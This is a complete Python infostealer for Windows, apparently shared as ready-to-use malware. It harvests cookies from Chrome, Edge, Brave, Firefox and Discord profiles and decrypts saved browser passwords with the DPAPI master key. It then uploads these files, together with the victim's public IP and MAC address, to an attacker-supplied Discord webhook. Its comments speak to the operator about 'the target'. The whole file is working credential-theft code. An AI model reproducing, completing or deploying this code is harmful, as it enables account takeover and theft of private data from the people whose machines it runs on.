import os
import os.path
from discord import Webhook, RequestsWebhookAdapter
import discord
import re, uuid
import requests
import sqlite3
import subprocess
import shutil
import base64
from Crypto.Cipher import AES
import json
import win32crypt

global user
user = os.environ.get("USERNAME")
chromePtr = r'C:\Users\\' + user + r'\AppData\Local\Google\Chrome\User Data\\'
firePtr = r"C:\Users\\" + user + "\\AppData\Roaming\Mozilla\Firefox\Profiles"
edgePtr = r'C:\Users\\' + user + r'\AppData\Local\Microsoft\Edge\User Data\\'
discPtr = r'C:\Users\\' + user + r'\AppData\Roaming\discord\\'
bravePtr = r'C:\Users\\' + user + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data'

# --- The function for sending files and information to our webhook...

def sendMessage(info, data):
    webhook = Webhook.from_url("INSERT YOUR WEBHOOK HERE", adapter=RequestsWebhookAdapter()) # Please insert your webhook, otherwise you won't get anything...
    webhook.send(info, file=data)

# --- The function for finding all our cookies through a ptr to the directory...

def locate(ptr):
    if ptr:
        for root, dirs, files in os.walk(ptr): # I want every Profile's cookies, just incase...
            for file in files:
                if file == 'cookies.sqlite': # Why the hell is FireFox special...
                    cookie_path = os.path.join(root,file)
                    parseFirefox(cookie_path)
                    sendFirefoxFile()
                elif file == 'Cookies' and 'Edge' not in ptr:
                    cookie_path = os.path.join(root,file)
                    parseDB(cookie_path)
                    sendDB()
                elif file == 'Login Data':
                    pwd_path = os.path.join(root,file)
                    grabPwd(pwd_path)
                    sendChrome()

def parseFirefox(cookie_path): # Self-explanatory
    con = sqlite3.connect(cookie_path)
    cur = con.cursor()
    for row in cur.execute('SELECT * FROM moz_cookies'):
        with open(file=r"C:\Users\\" + user + "\Desktop\info.txt", mode="at") as f:
            f.write(str(row) + "\n")

def sendFirefoxFile():
    with open(file=r"C:\Users\\" + user + "\Desktop\info.txt", mode="rt") as f:
        cookie_file = discord.File(f)
        sendMessage(info=None, data=cookie_file)
    os.remove(r"C:\Users\\" + user + "\Desktop\info.txt")

# --- These next few functions are just for parsing and sending data and finding information on the target...

def parseDB(cookie_path):
    con = sqlite3.connect(cookie_path)
    cur = con.cursor()
    for row in cur.execute('SELECT * FROM cookies'):
        with open(file=r"C:\Users\\" + user + "\Desktop\info2.txt", mode="at") as f:
            f.write(str(row) + "\n")

def sendChrome():
    if r"C:\Users\\" + user + "\Desktop\info3.txt":
        with open(file=r"C:\Users\\" + user + "\Desktop\info3.txt", mode="rt") as f:
            cookie_file = discord.File(f)
            sendMessage(info=None, data=cookie_file)
    os.remove(r"C:\Users\\" + user + "\Desktop\info3.txt")


def sendDB():
    with open(file=r"C:\Users\\" + user + "\Desktop\info2.txt", mode="rt") as f:
        cookie_file = discord.File(f)
        sendMessage(info=None, data=cookie_file)
    os.remove(r"C:\Users\\" + user + "\Desktop\info2.txt")

def findIP(): # Check to see if his network is vunerable
    public_ip = requests.get("https://api.ipify.org").text
    return public_ip

def macAdr(): # Good to know
    macAddr = (':'.join(re.findall('..', '%012x' % uuid.getnode())))
    return macAddr

def get_master_key(ptr):
     with open(ptr, "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]  # removing DPAPI
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
     return master_key

def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = generate_cipher(master_key, iv)
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
     except Exception as e:
         return "Chrome < 80"

def grabPwd(pwd_path):
    if "Chrome" in pwd_path:
        master_key = get_master_key(findLocalState(chromePtr))
    if "Edge" in pwd_path:
        master_key = get_master_key(findLocalState(edgePtr))
    if "Brave" in pwd_path:
        master_key = get_master_key(findLocalState(bravePtr))
    login_db = pwd_path
    shutil.copy2(login_db, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if len(username) > 0:
                with open(file=r"C:\Users\\" + user + "\Desktop\info3.txt", mode="wt") as f:
                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
            else:
                with open(file=r"C:\Users\\" + user + "\Desktop\info3.txt", mode="wt") as f:
                    f.write("I came up with nothing...")
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass


def findLocalState(ptr):
    for root,dirs,files in os.walk(ptr):
        for file in files:
            if file == 'Local State':
                path = os.path.join(root,file)
    return path








if __name__ == "__main__":
    print("[!] Initilizating set-up...")
    sendMessage(info="The user's IP is " + findIP() + "; The user's MAC Address is: " + macAdr(), data=None)
    locate(discPtr)
    locate(chromePtr)
    locate(edgePtr)
    locate(firePtr)
    locate(bravePtr)
